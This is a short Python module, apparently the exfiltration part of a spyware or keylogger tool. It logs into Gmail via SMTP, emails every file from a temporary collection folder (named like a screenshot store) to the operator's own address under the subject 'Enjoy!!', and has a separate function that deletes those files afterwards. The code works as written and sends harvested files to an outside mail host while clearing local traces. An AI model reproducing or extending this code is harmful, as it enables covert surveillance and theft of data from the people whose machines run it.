import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from os import listdir
import os
from savloc import temp
import time


def sendmail(mail,paswd):
    email = mail
    password = paswd
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = "Enjoy!!"
    loc_ss = temp()
    if not os.path.exists(loc_ss):
        os.mkdir(loc_ss)
    os.chdir(loc_ss)

    body = "Here are the files"
    msg.attach(MIMEText(body, 'plain'))

    for filename in os.listdir():
        attachment = open(filename, "rb")
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)
        #os.remove(filename)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email, password)
    text = msg.as_string()
    s.sendmail(email, email, text)
    s.quit()


def remove():
    loc_ss = temp()
    os.chdir(loc_ss)
    for filename in os.listdir():
        os.remove(filename)